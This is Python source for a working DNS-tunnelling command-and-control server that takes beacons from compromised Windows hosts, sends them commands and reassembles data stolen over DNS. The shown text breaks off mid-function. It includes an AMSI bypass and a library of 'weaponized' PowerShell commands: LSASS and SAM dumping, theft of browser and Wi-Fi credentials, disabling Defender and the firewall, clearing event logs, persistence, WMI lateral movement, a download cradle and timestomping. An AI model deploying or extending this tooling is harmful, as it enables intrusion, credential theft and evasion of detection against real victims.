import socket
import sys
import threading
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT, A
from binascii import hexlify, unhexlify
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.prompt import Prompt
from rich import box
import json
from datetime import datetime
import base64

# TAB completion support
try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

# Rich console setup
console = Console()

# Configuration
LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
DNS_PORT = 53
BASE_DOMAIN = "dns2.google.com"
DEBUG_MODE = False  # Set to True to see all beacon activity

# Storage for sessions and data
sessions = {}  # session_id -> {last_seen, ip, hostname, computer_name, username}
commands = defaultdict(lambda: "IDLE")  # session_id -> command
results = defaultdict(lambda: {})  # session_id -> {chunk_id: data}
chunk_metadata = {}  # session_id -> {total_chunks, start_time, last_update, retry_count}
new_connections = []  # Track new connections for notification

# Chunk transfer configuration
CHUNK_TIMEOUT = 20  # Seconds before considering transfer stale (reduced for faster response)
CHUNK_INCOMPLETE_TIMEOUT = 10  # Seconds to wait after last chunk before auto-completing
MAX_CHUNK_RETRIES = 2  # Maximum retry attempts

# Flag to stop chunk monitor thread
chunk_monitor_running = True

# Thread pool for concurrent chunk processing
chunk_executor = ThreadPoolExecutor(max_workers=5, thread_name_prefix="chunk_processor")

# Locks for thread-safe operations
results_lock = threading.Lock()
sessions_lock = threading.Lock()

# Advanced PowerShell Encoding and Obfuscation Functions
def encode_base64_powershell(script):
    encoded = base64.b64encode(script.encode('utf-16le')).decode()
    return f"powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand {encoded}"

def wrap_amsi_bypass(script):
    amsi_bypass = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
    return amsi_bypass + script

def wrap_script_block(script):
    return f"Invoke-Command -ScriptBlock {{{script}}}"

def add_error_handling(script):
    return f"""
try {{
    {script}
}} catch {{
    Write-Output "ERROR: $($_.Exception.Message)"
    Write-Output "StackTrace: $($_.ScriptStackTrace)"
}}
"""

# Advanced Weaponized PowerShell Commands (Cobalt Strike style)
WEAPONIZED_COMMANDS = {
    # System Enumeration
    'enum_system': {
        'cmd': 'Get-WmiObject Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,TotalPhysicalMemory,UserName',
        'desc': 'Enumerate system information (WMI)',
        'advanced': False
    },
    'enum_av': {
        'cmd': 'Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct | Select-Object displayName,productState',
        'desc': 'Check antivirus products (WMI)',
        'advanced': False
    },
    'enum_hotfixes': {
        'cmd': 'Get-HotFix | Select-Object HotFixID,Description,InstalledOn | Sort-Object InstalledOn -Descending',
        'desc': 'List installed security patches',
        'advanced': True
    },
    'enum_drives': {
        'cmd': 'Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free,Root',
        'desc': 'List all drives and space',
        'advanced': False
    },
    
    # Advanced AV/EDR Detection
    'enum_security_products': {
        'cmd': '''
Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct | Select-Object displayName,productState
Get-WmiObject -Namespace "root\\SecurityCenter2" -Class FirewallProduct | Select-Object displayName,productState
Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiSpywareProduct | Select-Object displayName,productState
''',
        'desc': 'Detect installed security products',
        'advanced': True
    },
    
    # User and Privilege Information
    'whoami_priv': {
        'cmd': 'whoami /priv',
        'desc': 'Show current user privileges',
        'advanced': False
    },
    'whoami_groups': {
        'cmd': 'whoami /groups',
        'desc': 'Show current user groups',
        'advanced': False
    },
    'enum_users': {
        'cmd': 'Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | Select-Object Name,Disabled,Status',
        'desc': 'List local users (WMI - compatible)',
        'advanced': False
    },
    'enum_admins': {
        'cmd': 'net localgroup administrators',
        'desc': 'List local administrators (CMD)',
        'advanced': False
    },
    
    # Network Enumeration (Compatible)
    'enum_network': {
        'cmd': 'Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object Description,IPAddress,MACAddress',
        'desc': 'Show network adapters and IPs (WMI)',
        'advanced': False
    },
    'enum_connections': {
        'cmd': 'netstat -ano',
        'desc': 'Show active connections (CMD)',
        'advanced': False
    },
    'enum_dns': {
        'cmd': 'ipconfig /displaydns',
        'desc': 'Show DNS cache (CMD)',
        'advanced': False
    },
    
    # Process and Service Enumeration
    'enum_processes': {
        'cmd': 'Get-Process | Select-Object Id,ProcessName,Path,Company | Sort-Object ProcessName',
        'desc': 'List running processes',
        'advanced': True
    },
    'enum_services': {
        'cmd': 'Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name,DisplayName,StartType',
        'desc': 'List running services',
        'advanced': True
    },
    
    # Advanced Credential Hunting
    'hunt_passwords': {
        'cmd': 'Get-ChildItem -Path C:\\ -Include *password*,*pass*,*pwd*,*credential* -Recurse -ErrorAction SilentlyContinue | Select-Object FullName',
        'desc': 'Search for password files',
        'advanced': True
    },
    'dump_credential_manager': {
        'cmd': 'cmdkey /list',
        'desc': 'List Windows Credential Manager',
        'advanced': False
    },
    'enum_saved_rdp': {
        'cmd': 'reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers" /s',
        'desc': 'List saved RDP connections',
        'advanced': False
    },
    'enum_putty_sessions': {
        'cmd': 'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s',
        'desc': 'List saved PuTTY sessions',
        'advanced': False
    },
    'find_chrome_db': {
        'cmd': 'Test-Path "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"',
        'desc': 'Check if Chrome credentials exist',
        'advanced': False
    },
    'copy_chrome_db': {
        'cmd': 'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" "$env:TEMP\\ChromeData"',
        'desc': 'Copy Chrome credentials to temp',
        'advanced': False
    },
    'find_firefox_db': {
        'cmd': 'Get-ChildItem "$env:APPDATA\\Mozilla\\Firefox\\Profiles" -Filter "logins.json" -Recurse -ErrorAction SilentlyContinue',
        'desc': 'Find Firefox credentials',
        'advanced': False
    },
    'dump_wifi_passwords': {
        'cmd': 'netsh wlan show profiles | Select-String \'All User Profile\' | %{$n=$_.Line.Substring($_.Line.IndexOf([char]58)+1).Trim(); Write-Output \"[$n]\"; netsh wlan show profile name=\"$n\" key=clear | Select-String \'Key Content\'}',
        'desc': 'Dump all WiFi profiles and passwords',
        'advanced': False
    },
    'search_passwords': {
        'cmd': 'Get-ChildItem -Path $env:USERPROFILE -Include *password*,*cred*,*pass*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-Object FullName',
        'desc': 'Search for password files',
        'advanced': False
    },
    
    # Advanced Defense Evasion
    'disable_defender_realtime': {
        'cmd': 'Set-MpPreference -DisableRealtimeMonitoring $true',
        'desc': '[ADMIN] Disable Windows Defender real-time protection',
        'advanced': True
    },
    'disable_firewall': {
        'cmd': 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False',
        'desc': '[ADMIN] Disable Windows Firewall',
        'advanced': True
    },
    'clear_event_logs': {
        'cmd': 'wevtutil cl System; wevtutil cl Security; wevtutil cl Application',
        'desc': '[ADMIN] Clear Windows Event Logs',
        'advanced': True
    },
    
    # AMSI Bypass (Short version for DNS)
    'amsi_bypass': {
        'cmd': '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        'desc': 'Disable AMSI protection',
        'advanced': False
    },
    
    # Advanced Persistence (Simplified for DNS)
    'persist_startup': {
        'cmd': 'Copy-Item $env:TEMP\\payload.exe "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe"',
        'desc': 'Simple startup folder persistence',
        'advanced': False
    },
    'persist_registry': {
        'cmd': 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "C:\\Windows\\Temp\\payload.exe"',
        'desc': 'Registry run key persistence',
        'advanced': False
    },
    
    # Advanced Lateral Movement (Simplified)
    'wmi_exec_simple': {
        'cmd': '([WMICLASS]"\\\\TARGET\\root\\cimv2:Win32_Process").Create("cmd.exe /c whoami")',
        'desc': 'Execute command via WMI (replace TARGET)',
        'advanced': True
    },
    'test_admin_access': {
        'cmd': 'Test-Path "\\\\DC01\\C$\\Windows"',
        'desc': 'Test admin access to DC01 (modify target)',
        'advanced': False
    },
    
    # Advanced Information Gathering (Simplified)
    'extract_sam': {
        'cmd': 'reg save hklm\\sam C:\\Windows\\Temp\\sam.save; reg save hklm\\system C:\\Windows\\Temp\\system.save',
        'desc': '[ADMIN] Extract SAM database',
        'advanced': True
    },
    'dump_lsass': {
        'cmd': 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full',
        'desc': '[ADMIN] Dump LSASS memory',
        'advanced': True
    },
    
    # Advanced PowerShell Empire-style Modules (Note: Use ps: for download cradles manually)
    'download_cradle': {
        'cmd': 'iex (New-Object Net.WebClient).DownloadString("http://your-server/script.ps1")',
        'desc': 'PowerShell download cradle (edit URL)',
        'advanced': True
    },
    
    # Network Reconnaissance (Compatible)
    'port_scan_single': {
        'cmd': '(New-Object System.Net.Sockets.TcpClient).Connect("192.168.1.1",445)',
        'desc': 'Test single port (modify IP/port)',
        'advanced': False
    },
    'ping_host': {
        'cmd': 'Test-Connection 192.168.1.1 -Count 1',
        'desc': 'Ping a host (modify IP)',
        'advanced': False
    },
    
    # Advanced Data Exfiltration (Simplified)
    'compress_data': {
        'cmd': 'Compress-Archive -Path $env:USERPROFILE\\Documents -DestinationPath $env:TEMP\\data.zip -Force',
        'desc': 'Compress Documents folder',
        'advanced': False
    },
    
    # Advanced Anti-Forensics (Simplified)
    'timestomp_file': {
        'cmd': '(Get-Item C:\\Windows\\Temp\\file.exe).CreationTime = (Get-Date).AddYears(-1)',
        'desc': 'Modify file timestamp (edit path)',
        'advanced': True
    },
    'clear_logs': {
        'cmd': 'Clear-EventLog -LogName Application,System,Security',
        'desc': '[ADMIN] Clear Windows event logs',
        'advanced': True
    }
}

# Convert hex string to regular string
def hex_to_string(hex_str):
    try:
        return unhexlify(hex_str).decode('utf-8', errors='replace')
    except:
        return ""

# Get hostname from IP (with timeout for performance)
def get_hostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except:
        return "Unknown"

# Advanced PowerShell command processor
def process_powershell_command(command_data, session_id):
    try:
        # Check if it's a base64 encoded command
        if command_data.startswith("b64:"):
            encoded_cmd = command_data[4:]
            try:
                decoded_cmd = base64.b64decode(encoded_cmd).decode('utf-8')
                return decoded_cmd
            except:
                return command_data
        
        # Check for advanced weaponized commands
        if command_data.startswith("weapon:"):
            weapon_name = command_data[7:]
            if weapon_name in WEAPONIZED_COMMANDS:
                weapon_cmd = WEAPONIZED_COMMANDS[weapon_name]['cmd']
                
                # Return in client-compatible format: "ps:<command>" for PowerShell
                # Or plain command for CMD commands
                # No automatic AMSI bypass - user should run amsi_bypass_simple first if needed
                return "ps:" + weapon_cmd.strip()
        
        # Regular PowerShell command - already has ps: prefix
        if command_data.startswith("ps:"):
            # Return as-is, client will handle it
            return command_data
        
        return command_data
        
    except Exception as e:
        console.print(f"❌ [bold red]Error processing PowerShell command:[/bold red] {e}")
        return command_data

# Process complete chunk data in thread pool (FAST)
def process_complete_chunks(session_id, chunk_data, total_chunks):
    try:
        received_count = len(chunk_data)
        missing_chunks = []
        
        # Check for missing chunks
        for i in range(total_chunks):
            if i not in chunk_data:
                missing_chunks.append(i)
        
        if missing_chunks:
            console.print(f"⚠️  [yellow]Warning: {len(missing_chunks)} chunks missing from {session_id}[/yellow]")
            console.print(f"📊 [dim]Missing chunks: {missing_chunks[:10]}{'...' if len(missing_chunks) > 10 else ''}[/dim]")
            console.print(f"🔄 [yellow]Processing {received_count}/{total_chunks} available chunks...[/yellow]")
        else:
            console.print(f"📥 [bold green]Data transfer complete from session {session_id}[/bold green]")
        
        # Fast reconstruction - skip missing chunks
        full_hex = ""
        for i in range(total_chunks):
            if i in chunk_data:
                full_hex += chunk_data[i]['data']
        
        # Decode data
        decoded = hex_to_string(full_hex)
        
        # Display output in a panel
        border_style = "yellow" if missing_chunks else "green"
        title_prefix = "⚠️  Partial" if missing_chunks else "📄"
        
        output_panel = Panel(
            decoded,
            title=f"{title_prefix} Command Output from [cyan]{session_id}[/cyan] ({received_count}/{total_chunks} chunks)",
            title_align="left",
            border_style=border_style,
            padding=(1, 2)
        )
        console.print(output_panel)
        
    except Exception as e:
        console.print(f"❌ [bold red]Error processing chunks:[/bold red] {e}")

# Background thread to monitor and auto-complete stalled chunk transfers
def chunk_monitor_thread():
    """Monitor chunk transfers and auto-complete stuck transfers"""
    global chunk_monitor_running
    
    while chunk_monitor_running:
        try:
            time.sleep(2)  # Check every 2 seconds
            current_time = time.time()
            
            with results_lock:
                sessions_to_complete = []
                
                for session_id, metadata in list(chunk_metadata.items()):
                    if session_id not in results or not results[session_id]:
                        # No chunks received yet or already processed
                        continue
                    
                    elapsed_since_update = current_time - metadata['last_update']
                    received_chunks = len(results[session_id])
                    total_chunks = metadata['total_chunks']
                    
                    # Auto-complete if no new chunks for CHUNK_INCOMPLETE_TIMEOUT seconds
                    if elapsed_since_update >= CHUNK_INCOMPLETE_TIMEOUT and received_chunks < total_chunks:
                        sessions_to_complete.append((session_id, received_chunks, total_chunks))
                
                # Process stuck transfers outside the lock
                for session_id, received, total in sessions_to_complete:
                    if session_id in results and results[session_id]:
                        console.print(f"⏱️  [yellow]Auto-completing stuck transfer for {session_id}[/yellow]")
                        console.print(f"📊 [dim]Received {received}/{total} chunks - Processing available data...[/dim]")
                        
                        chunk_data = dict(results[session_id])
                        results[session_id] = {}
                        
                        if session_id in chunk_metadata:
                            del chunk_metadata[session_id]
                        
                        # Process in thread pool
                        chunk_executor.submit(process_complete_chunks, session_id, chunk_data, total)
        
        except Exception as e:
            if DEBUG_MODE:
                console.print(f"[dim red]Chunk monitor error: {e}[/dim red]")
            time.sleep(5)

# Parse the DNS query name to extract information
def parse_query(qname):
    parts = str(qname).rstrip('.').split('.')
    
    if len(parts) < 2:
        return None, None, None
    
    query_type = parts[0]
    
    # Beacon query: beacon.<session_id>.<computername>.<username>.<BASE_DOMAIN>
    if query_type == "beacon":
        session_id = parts[1] if len(parts) > 1 else None
        computer_name = parts[2] if len(parts) > 2 else "Unknown"
        username = parts[3] if len(parts) > 3 else "Unknown"
        return "beacon", session_id, {
            'computer_name': computer_name,
            'username': username
        }
    
    # Data exfiltration: data.<session_id>.<chunk_num>.<total_chunks>.<hex_data>.c2.example.com
    elif query_type == "data":
        if len(parts) >= 5:
            session_id = parts[1]
            chunk_num = int(parts[2])
            total_chunks = int(parts[3])
            hex_data = parts[4]
            return "data", session_id, {
                'chunk_num': chunk_num,
                'total_chunks': total_chunks,
                'data': hex_data
            }
    # Return None if query type is not found
    return None, None, None

# Handle incoming DNS query
def handle_dns_query(data, addr, sock):
    try:
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        
        # Parse the query
        query_type, session_id, query_data = parse_query(qname)
        
        if query_type == "beacon" and session_id:
            # Extract computer name and username from query_data
            computer_name = query_data.get('computer_name', 'Unknown') if query_data else 'Unknown'
            username = query_data.get('username', 'Unknown') if query_data else 'Unknown'
            
            # Thread-safe session management
            with sessions_lock:
                is_new_connection = session_id not in sessions
                
                # Store session info with IP, hostname, computer name, and username
                if is_new_connection:
                    hostname = get_hostname(addr[0])
                    sessions[session_id] = {
                        'last_seen': time.time(),
                        'ip': addr[0],
                        'hostname': hostname,
                        'computer_name': computer_name,
                        'username': username
                    }
                else:
                    sessions[session_id]['last_seen'] = time.time()
                    # Update computer name and username if provided
                    if computer_name != 'Unknown':
                        sessions[session_id]['computer_name'] = computer_name
                    if username != 'Unknown':
                        sessions[session_id]['username'] = username
            
            # Get command for this session
            command = commands.get(session_id, "IDLE")
            
            # Process advanced PowerShell commands
            if command != "IDLE" and (command.startswith("ps:") or command.startswith("weapon:")):
                command = process_powershell_command(command, session_id)
            
            # Check command length and warn if too long
            if len(command) > 250:
                console.print(f"⚠️  [bold yellow]WARNING:[/bold yellow] Command length ({len(command)} bytes) may exceed DNS TXT limits. Consider shortening.")
            
            # Create DNS response with TXT record containing command
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            
            if qtype == "TXT":
                # Return command in TXT record
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command), ttl=0))
            else:
                # Return dummy A record
                reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            
            sock.sendto(reply.pack(), addr)
            
            # Notify about new connection
            if is_new_connection:
                new_connections.append(session_id)
                console.print(Panel.fit(
                    f"🎯 [bold green]NEW CLIENT CONNECTED![/bold green]\n\n"
                    f"• Session ID: [cyan]{session_id}[/cyan]\n"
                    f"• Computer Name: [green]{computer_name}[/green]\n"
                    f"• Username: [magenta]{username}[/magenta]\n"
                    f"• Source IP: [yellow]{addr[0]}[/yellow]\n"
                    f"• Hostname: [blue]{sessions[session_id]['hostname']}[/blue]\n"
                    f"• Time: [dim]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
                    title="🚀 CLIENT CONNECTION DETECTED",
                    border_style="green",
                    padding=(1, 2)
                ))
            
            # Debug: Show beacon activity
            if DEBUG_MODE and not is_new_connection:
                console.print(f"🔔 [dim]Beacon from {session_id} ({computer_name}@{addr[0]}) - Command: {command[:20]}...[/dim]")
            
            # Clear command after sending and show feedback
            if command != "IDLE":
                cmd_preview = command[:100] + '...' if len(command) > 100 else command
                console.print(f"📤 [bold green]Command sent to {session_id}:[/bold green] [yellow]{cmd_preview}[/yellow]")
                console.print(f"📊 [dim]Command size: {len(command)} bytes | Query type: {qtype}[/dim]")
                commands[session_id] = "IDLE"
        
        elif query_type == "data" and session_id and query_data:
            # Store data chunk (FAST & SIMPLE)
            chunk_num = query_data['chunk_num']
            total_chunks = query_data['total_chunks']
            hex_data = query_data['data']
            current_time = time.time()
            
            # Thread-safe chunk storage (simplified)
            with results_lock:
                if session_id not in results:
                    results[session_id] = {}
                
                # Initialize or update metadata
                if session_id not in chunk_metadata:
                    chunk_metadata[session_id] = {
                        'total_chunks': total_chunks,
                        'start_time': current_time,
                        'last_update': current_time,
                        'retry_count': 0
                    }
                else:
                    chunk_metadata[session_id]['last_update'] = current_time
                
                # Store chunk (allow duplicates to overwrite)
                results[session_id][chunk_num] = {
                    'data': hex_data,
                    'total': total_chunks
                }
                
                # Show progress for data transfer
                received_chunks = len(results[session_id])
                progress_percent = (received_chunks / total_chunks) * 100
                
                if received_chunks == total_chunks:
                    # All chunks received - INSTANT processing
                    chunk_data = dict(results[session_id])
                    results[session_id] = {}
                    
                    # Clean up metadata
                    if session_id in chunk_metadata:
                        del chunk_metadata[session_id]
                    
                    # Process immediately
                    chunk_executor.submit(process_complete_chunks, session_id, chunk_data, total_chunks)
                else:
                    # Show progress (more frequent updates for better feedback)
                    if received_chunks == 1:
                        console.print(f"📦 [bold blue]Data transfer started: {session_id}[/bold blue] - {total_chunks} chunks expected")
                    elif received_chunks % 5 == 0 or progress_percent >= 90:
                        # Update every 5 chunks OR every chunk when >= 90%
                        console.print(f"📊 [{session_id[:8]}] {received_chunks}/{total_chunks} chunks ({progress_percent:.0f}%)")
            
            # Send empty response
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            sock.sendto(reply.pack(), addr)
        
        else:
            # Unknown query, send default response
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            sock.sendto(reply.pack(), addr)
    
    except Exception as e:
        console.print(f"❌ [bold red]Error handling query:[/bold red] {e}")

# Start the DNS server
def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind((LISTEN_IP, DNS_PORT))
        console.print(Panel.fit(
            f"🎯 [bold cyan]DNS SERVER ACTIVE ON[/bold cyan] [yellow]{LISTEN_IP}:{DNS_PORT}[/yellow]\n"
            f"🌐 [bold cyan]CONTROL DOMAIN:[/bold cyan] [green]{BASE_DOMAIN}[/green]",
            title="🛡️  C2 SERVER ONLINE",
            border_style="blue"
        ))
    except PermissionError:
        console.print(Panel(
            "💥 [bold red]PORT ACCESS DENIED[/bold red]\nRun as Administrator/root to bind to port 53",
            title="SYSTEM ERROR",
            border_style="red"
        ))
        sys.exit(1)
    except Exception as e:
        console.print(Panel(
            f"💥 [bold red]SERVER INIT FAILED:[/bold red] {e}",
            title="SYSTEM ERROR",
            border_style="red"
        ))
        sys.exit(1)
    
    # Server startup progress
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
    ) as progress:
        startup_task = progress.add_task("Initializing covert DNS channel...", total=100)
        for i in range(100):
            progress.update(startup_task, advance=1)
            time.sleep(0.01)
    
    console.print("🔄 [bold green]Listening for client beacons...[/bold green]\n")
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            # Handle query in main thread for simplicity (could be threaded)
            handle_dns_query(data, addr, sock)
        except KeyboardInterrupt:
            console.print("\n🛑 [yellow]Server shutdown initiated...[/yellow]")
            break
        except Exception as e:
            console.print(f"❌ [bold red]Server error:[/bold red] {e}")

def create_session_table():
    # Create a rich table for displaying sessions
    table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
    table.add_column("#", style="dim", width=3)
    table.add_column("Session ID", style="cyan", width=10)
    table.add_column("Computer", style="green", width=15)
    table.add_column("Username", style="magenta", width=12)
    table.add_column("IP Address", style="yellow", width=15)
    table.add_column("Status", justify="center", width=10)
    table.add_column("Last Beacon", style="blue", width=10)
    table.add_column("Age", justify="right", width=7)
    
    current_time = time.time()
    for idx, (session_id, session_info) in enumerate(sorted(sessions.items()), 1):
        last_seen = session_info['last_seen']
        ip = session_info['ip']
        hostname = session_info.get('hostname', 'Unknown')
        computer_name = session_info.get('computer_name', 'Unknown')
        username = session_info.get('username', 'Unknown')
        age = current_time - last_seen
        status = "🟢 ACTIVE" if age < 30 else "🟡 IDLE"
        age_str = f"{age:.1f}s"
        
        table.add_row(
            str(idx),
            session_id[:10],
            computer_name[:15] if len(computer_name) > 15 else computer_name,
            username[:12] if len(username) > 12 else username,
            ip,
            status,
            datetime.fromtimestamp(last_seen).strftime('%H:%M:%S'),
            age_str
        )
    
    return table

# Command completer class for TAB completion
class CommandCompleter:
    def __init__(self):
        self.base_commands = [
            'sessions', 'use', 'exit', 'clear', 'help', 
            'back', 'disconnect', 'kill', 'info', 'powershell', 'ps', 'shell',
            'weaponize', 'weapons', 'exploit', 'advanced', 'debug'
        ]
        self.current_session = None
        self.shell_mode = None  # None, 'powershell', or 'cmd'
    
    def set_session(self, session):
        self.current_session = session
    
    def set_shell_mode(self, mode):
        self.shell_mode = mode
    
    def complete(self, text, state):
        buffer = readline.get_line_buffer()
        line = buffer.lstrip()
        
        # If we're completing after "use ", suggest session IDs
        if line.startswith('use '):
            matches = [sid for sid in sessions.keys() if sid.startswith(text)]
        elif line.startswith('weaponize '):
            matches = [cmd for cmd in WEAPONIZED_COMMANDS.keys() if cmd.startswith(text)]
        else:
            # Complete base commands
            matches = [cmd for cmd in self.base_commands if cmd.startswith(text)]
        
        try:
            return matches[state]
        except IndexError:
            return None

def command_interface():
    # Interactive command interface
    time.sleep(1)  # Let server start
    
    # Setup TAB completion
    completer = CommandCompleter()
    if readline:
        readline.set_completer(completer.complete)
        readline.parse_and_bind('tab: complete')
        readline.set_completer_delims(' \t\n')
    
    # Display help in a nice panel
    help_panel = Panel(
        "[bold]ADVANCED COMMAND REFERENCE:[/bold]\n\n"
        "[yellow]Session Management:[/yellow]\n"
        "• [cyan]sessions[/cyan]                 - List all connected clients\n"
        "• [cyan]use <session_id>[/cyan]         - Select client session by ID\n"
        "• [cyan]use <number>[/cyan]             - Select client session by number\n"
        "• [cyan]back[/cyan]                     - Return to main console\n"
        "• [cyan]info[/cyan]                     - Show current session details\n"
        "• [cyan]disconnect <session_id>[/cyan]  - Remove inactive session\n\n"
        "[yellow]Shell Modes:[/yellow]\n"
        "• [cyan]shell cmd[/cyan]                - Switch to CMD shell mode\n"
        "• [cyan]shell powershell[/cyan]         - Switch to PowerShell shell mode\n"
        "• [cyan]ps <command>[/cyan]             - Execute single PowerShell command\n"
        "• [cyan]<command>[/cyan]                - Execute command (current shell mode)\n\n"
        "[yellow]⚔️  Advanced Weaponized Commands:[/yellow]\n"
        "• [cyan]weaponize[/cyan]                - List all weaponized commands\n"
        "• [cyan]weaponize <cmd>[/cyan]          - Execute weaponized command\n"
        "• [cyan]weaponize amsi_bypass[/cyan]    - Disable AMSI (run first for evasion)\n"
        "• [cyan]advanced</cyan>                 - Show only advanced commands\n\n"
        "[yellow]Utility:[/yellow]\n"
        "• [cyan]debug[/cyan]                    - Toggle debug mode (show beacon activity)\n"
        "• [cyan]clear[/cyan]                    - Clear screen\n"
        "• [cyan]help[/cyan]                     - Show this help menu\n"
        "• [cyan]exit[/cyan]                     - Shutdown server\n\n"
        "[dim]💡 Tip: Use TAB for auto-completion | Advanced commands include AMSI bypass[/dim]",
        title="🎮 ADVANCED CONTROL PANEL",
        border_style="green",
        padding=(1, 2)
    )
    console.print(help_panel)
    console.print()
    
    current_session = None
    shell_mode = "cmd"  # Default shell mode: 'cmd' or 'powershell'
    
    while True:
        try:
            # Update completer with current session and shell mode
            completer.set_session(current_session)
            completer.set_shell_mode(shell_mode)
            
            # Create a dynamic prompt with session info and shell mode
            if current_session:
                prompt_text = Text()
                prompt_text.append("💀 ", style="bold red")
                prompt_text.append(f"Session {current_session}", style="bold cyan")
                if shell_mode == "powershell":
                    prompt_text.append(" [PS]", style="bold blue")
                else:
                    prompt_text.append(" [CMD]", style="bold yellow")
                prompt_text.append(" > ", style="bold white")
            else:
                prompt_text = Text()
                prompt_text.append("⚡ ", style="bold yellow")
                prompt_text.append("C2", style="bold green")
                prompt_text.append(" > ", style="bold white")
            
            # Use readline for input if available (supports TAB completion)
            if readline:
                console.print(prompt_text, end="")
                cmd = input().strip()
            else:
                cmd = Prompt.ask(prompt_text).strip()
            
            if not cmd:
                continue
            
            if cmd.lower() == "exit":
                console.print(Panel(
                    "🛑 [bold red]SERVER SHUTDOWN COMPLETE[/bold red]",
                    border_style="red"
                ))
                sys.exit(0)
            
            elif cmd.lower() == "help":
                console.print(help_panel)
            
            elif cmd.lower() == "sessions":
                if sessions:
                    session_table = create_session_table()
                    console.print(Panel(
                        session_table,
                        title=f"👥 ACTIVE CLIENTS - {len(sessions)} CONNECTED",
                        border_style="cyan"
                    ))
                else:
                    console.print(Panel(
                        "😴 [yellow]No active client sessions[/yellow]",
                        border_style="yellow"
                    ))
            
            elif cmd.lower() == "clear":
                console.clear()
            
            elif cmd.lower() == "debug":
                global DEBUG_MODE
                DEBUG_MODE = not DEBUG_MODE
                status = "ENABLED" if DEBUG_MODE else "DISABLED"
                status_color = "green" if DEBUG_MODE else "yellow"
                console.print(Panel.fit(
                    f"🐛 [bold {status_color}]DEBUG MODE {status}[/bold {status_color}]\n\n"
                    f"{'Beacon activity will now be displayed in real-time' if DEBUG_MODE else 'Beacon activity logging disabled'}",
                    border_style=status_color
                ))
            
            elif cmd.lower() == "back":
                if current_session:
                    console.print(Panel.fit(
                        f"🔙 [bold yellow]RETURNED TO MAIN CONSOLE[/bold yellow]",
                        border_style="yellow"
                    ))
                    current_session = None
                    shell_mode = "cmd"  # Reset to CMD when returning
                else:
                    console.print("❌ [red]Already at main console[/red]")
            
            elif cmd.lower().startswith("shell "):
                if current_session:
                    parts = cmd.split(maxsplit=1)
                    if len(parts) >= 2:
                        mode = parts[1].lower()
                        if mode in ['cmd', 'powershell', 'ps']:
                            if mode == 'ps':
                                mode = 'powershell'
                            shell_mode = mode
                            shell_display = "PowerShell" if mode == "powershell" else "CMD"
                            console.print(Panel.fit(
                                f"🐚 [bold green]SHELL MODE CHANGED:[/bold green] [cyan]{shell_display}[/cyan]",
                                border_style="green"
                            ))
                        else:
                            console.print("❌ [red]Invalid shell mode. Use: cmd or powershell[/red]")
                    else:
                        console.print("❌ [red]Usage: shell <cmd|powershell>[/red]")
                else:
                    console.print("❌ [red]No session selected[/red]")
            
            elif cmd.lower() == "advanced":
                # Show only advanced commands
                table = Table(show_header=True, header_style="bold red", box=box.ROUNDED)
                table.add_column("#", style="dim", width=4)
                table.add_column("Command", style="cyan", width=25)
                table.add_column("Description", style="white", width=45)
                table.add_column("Features", style="yellow", width=20)
                
                advanced_commands = {k: v for k, v in WEAPONIZED_COMMANDS.items() if v.get('advanced', False)}
                
                for idx, (cmd_name, cmd_info) in enumerate(sorted(advanced_commands.items()), 1):
                    features = "AMSI Bypass | Error Handling"
                    table.add_row(str(idx), cmd_name, cmd_info['desc'], features)
                
                console.print(Panel(
                    table,
